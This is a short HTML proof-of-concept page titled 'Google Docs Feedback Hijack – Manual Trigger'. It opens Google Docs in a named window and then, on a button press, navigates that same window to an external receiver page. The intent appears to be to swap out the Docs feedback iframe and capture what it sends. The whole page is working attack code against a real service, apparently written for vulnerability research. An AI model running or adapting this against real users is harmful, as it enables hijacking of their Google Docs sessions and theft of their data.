<!DOCTYPE html>
<html>
<head>
  <title>Google Docs Feedback Hijack – Manual Trigger</title>
</head>
<body>
  <h2>Docs Feedback Hijack (Manual Timing)</h2>

  <p>This variant allows you to open Docs in a named window and manually trigger the swap at the right time.</p>

  <button onclick="openDocs()">Open Docs</button>
  <button onclick="swap()">Swap Feedback Iframe</button>

  <script>
    function openDocs() {
      window.open("https://docs.google.com/document/u/0/create", "feedbackwin");
    }

    function swap() {
      window.open("https://musgaas.github.io/receiver-test/receiver.html", "feedbackwin");
      console.log("✅ Swapped feedback iframe");
    }
  </script>
</body>
</html>
